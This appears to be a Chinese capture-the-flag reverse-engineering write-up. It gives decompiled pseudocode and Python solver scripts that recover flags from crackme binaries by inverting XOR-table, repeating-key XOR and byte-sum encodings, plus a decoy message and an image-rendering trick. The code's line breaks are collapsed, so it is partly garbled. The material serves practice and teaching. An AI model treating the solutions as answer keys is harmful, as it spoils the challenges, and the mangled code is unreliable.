cin, &v11);v3 = v10 % 299;v4 = v11 % 299;v5 = 0;v9 = v11 % 299;v6 = strlen(v12);if ( v6 ){ do { v8 = dword_403AA0[300 * v3 + v4] ^ v12[v5]; // 在300*300的表中查找索引并 v3 = (v8 + v3) % 299; // 对明文异或 v9 = (v8 + v9) % 300; std::
ostream::
operator<<(std::
cout, v8); sub_401460(); // 输出当前密文 v4 = v9; ++v5; } while ( v5 < v6 );}sub_401460(); // 输出提示信息以及一大堆密文return 0;
datas = []
enc = [90,171,198,235,229,43,246,92,198,203,233,228,6,128,215,68,201,4,220,214,169,245,208,199,112,170,119,251,244,58,237,4,70,231,200,45,186,137,247,225,243,13,145,139,190,146,194,242,253,56,239,5,41,225,105,51,247,79,170,231,88,64,224,138,222,220,229,88,43,117,236,189,228,205,150,65,26,205,232,141,116,149,185,89,212,251,16,215,205,17,238,22,245,77,220,198,224,248,223,209,205,167,223,210,165,247,190,3,5,246,243,228,181,33,42,207,174,138,244,118,192,22,219,60,80,229,144,219,133,211,221,229,190,58,151,240,183,207,221,60,77,217,220,74,105,220,221,165,85,174,43,183,188,190,252,255,130,137,189,201,239,181,150,143,214,203,26,211,103,222,105,87,214,179,83,185,104,206,229,172,221,117,163,57,106,200,46,165,193,135,243,166,168,209,144,52,210,12,58,10,103,5,211,55,172,76,88,250,136,245,167,139,241,26,92,97,139,241,137,27,53,211,251,191,240,173,14,231,241,242,255,122,144,97,234,36,175,155,253,35,156,229,19,166,191,140,195,218,130,35,200,178,245,41,162,243,214,222,87,83,195,144,55,159,208,241,193,233,204,228,196,105,84,58,220,226,1,47,248,138,177,124,236,53,210,79,250,106,27,244,251,203,210,103,213,218,183,4,40,28,12,175,52,224,203,89,176,174,175,233,43,20,103,152,201,4,148,76,241,103,135,139,136,246,80,184,255,194,149,239,206,207,246,166,20,63,202,199,177,214,60,99,74,211,219,94,247,193,40,212,197,175,30,244,41,24,113,27,249,213,225,55,188,193,165,220,174,252,105,154,74,126,174,255,110,169,103,44,246,255,98,251,211,87,171,62,67,250,69,149,18,77,159,137,168,231,187,97,174,115,243,44,128,151,90,246,83,11,138,67,184,22,53,228,230,252,76,112,20,136,131,90,233,248,67,207,61,212,113,62,239,203,201,66,83,179,16,209,253,63,206,208,101,150,196,145,101,220,22,79,241,69,237,219,97,87,20,22,240,244,218,7,237,42,14,8,38,115,141,102,206,191,142,55,196,200,142,98,16,129,53,52,50,197,53,219,2,66,152,192,245,243,69,26,132,240,164,90,246,200,53,89,221,119,139,76,47,132,53,47,249,26,53,141,113,69,76,152,121,193,53,176,97,135,205,206,237,108,251,38,216,108,12,220,209,194,26,243,217,231,36,117,235,106,205,43,254,75,209,141,239,200,5,183,219,166,113,9,16,154,116,144,238,208,245,136,173,16,103,107,114,17,208,181,196,98,212,133,211,252]
with open("/Users/linkle/Downloads/re1.exe", "rb") as f: exe = f.read() bins = exe[0x28A0:
0x5A6E0] for xx in range(0, len(bins), 4): datas.append(ord(bins[xx: xx+1]))
for n1 in range(300): for n2 in range(300): for ch in range(32, 128): if 300 * n1 + n2 >= len(datas): continue # print(300 * n1 + n2) if datas[300 * n1 + n2] ^ ch == enc[0]: flag = 0 n1_r = n1 n2_r = n2 for i in range(1, 32): n1_r = (enc[i-1] + n1_r) % 299 n2_r = (enc[i-1] + n2_r) % 300
 try: for ch2 in range(32, 128): if datas[300 * n1_r + n2_r] ^ ch2 == enc[i]: flag += 1 break 
except: continue if flag >= 31: print(n1, n2, ch) # 对得上大部分密文的话估计就是正确数字了
flag不在这里呦,就像生活，你跨过了人山人海，你跨过了明月清风，你见过了三更灯火，你见过了黎明的城市。
你觉得你已经足够努力，你觉得你理应破浪乘风。你满身疲惫你筋疲力竭
可惜，罗马不在前方。或者，罗马永远在前方，在别人出生的地方。
本狸，强烈建议你回到最初的地方好好研究下加密矩阵有惊喜哦
with open("/Users/linkle/Downloads/re1.exe", "rb") as f: exe = f.read() bins = exe[0x28A0:
0x5A6E0] for xx in range(0, len(bins), 4): datas.append(ord(bins[xx: xx+1]))
from PIL import Image
newimg = Image.new('RGB',(300, 300))for i in range(300): for j in range(300): newimg.putpixel((i, j), (datas[300 * i + j], 0, 0))newimg.save('flag.png')
strcpy(keys, "key123");printf((char *)&Format, v16[0]);v4 = _acrt_iob_func(0);fgets(Buffer, 100, v4);v5 = strcspn(Buffer, "n");if ( v5 >= 0x64 ) goto LABEL_16;v15 = v3;Buffer[v5] = 0;index = 0;v7 = strlen(Buffer);if ( v7 ){ len_keys = strlen(keys); do { v17[index] = Buffer[index] ^ keys[index % len_keys]; ++index; } while ( index < v7 ); if ( index >= 0xC9 ) goto LABEL_16;}v17[index] = 0;v9 = 0;v10 = strlen(v17);if ( v10 ){ v11 = v16; do { sprintf(v11, "%02x", v17[v9++]); v11 += 2; } while ( v9 < v10 );}v12 = 2 * v9;if ( v12 >= 0xC9 ){LABEL_16: __report_rangecheckfailure(v15); __debugbreak();}v16[v12] = 0;printf("n", v15);v13 = strcmp(v16, "08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216");if ( v13 ) v13 = v13 < 0 ? -1 : 1;if ( v13 ) printf("flag is false: ", v16[0]);else printf("flag is true: ", v16[0]);system("pause");
key = "key123"s = "08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216"for i in range(0, len(s), 2): print(chr(int(s[i:i+2], 16) ^ ord(key[i//2 % len(key)])), end="")
f = open("/Users/linkle/Downloads/babyre", "rb").read()datas = []for ch in f[0x1524:
0x153C]: datas.append(ch)
def enc(s): len_s = len(s) for i in range(len_s): t = 0 for j in range(len_s): t += s[j] s[i] = t & 0xff return s
def dec(s): len_s = len(s) for i in range(len_s - 1, -1, -1): for c in range(0xff): # print(s[:i]+s[i+1:]) if sum(s[:i]+s[i+1:]+[c]) & 0xff == s[i]: s[i] = c # print(c) break # break return sprint("".join(list(map(chr, dec(datas.copy())))))
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]